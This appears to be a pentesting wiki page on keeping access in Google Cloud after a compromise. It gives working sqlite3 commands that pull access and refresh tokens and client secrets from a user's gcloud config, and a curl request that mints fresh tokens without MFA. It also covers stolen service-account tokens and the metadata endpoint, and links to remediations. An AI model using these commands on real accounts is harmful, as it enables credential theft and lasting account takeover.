These are useful techniques once, somehow, you have compromised some GCP credentials or machine running in a GCP environment.

## Token Hijacking

### Authenticated User

If you manage to access the home folder of an **authenticated user in GCP**, by **default**, you will be able to **get tokens for that user as long as you want** without needing to authenticated and independently on the machine you use his tokens from and even if the user has MFA configured.

This is because by default you **will be able to use the refresh token as long** as you want to generate new tokens.

To get the current token of a user you can run:

{% code overflow="wrap" %}
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

To get the details to generate a new access token run:

{% code overflow="wrap" %}
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

To get a new refreshed access token with the refresh token, client ID, and client secret run:

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

The refresh tokens validity can be managed in **Admin** > **Security** > **Google Cloud session control**, and by default it's set to 16h although it can be set to never expire:

### Service Accounts

Just like with authenticated users, if you manage to **compromise the private key file** of a service account you will be able to **access it usually as long as you want**.\
However, if you steal the **OAuth token** of a service account this can be even more interesting, because, even if by default these tokens are useful just for an hour, if the **victim deletes the private api key, the OAuh token will still be valid until it expires**.

### Metadata

Obviously, as long as you are inside a machine running in the GCP environment you will be able to **access the service account attached to that machine contacting the metadata endpoint** (note that the Oauth tokens you can access in this endpoint are usually restricted by scopes).

### Remediations

Some remediations for these techniques are explained in [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)
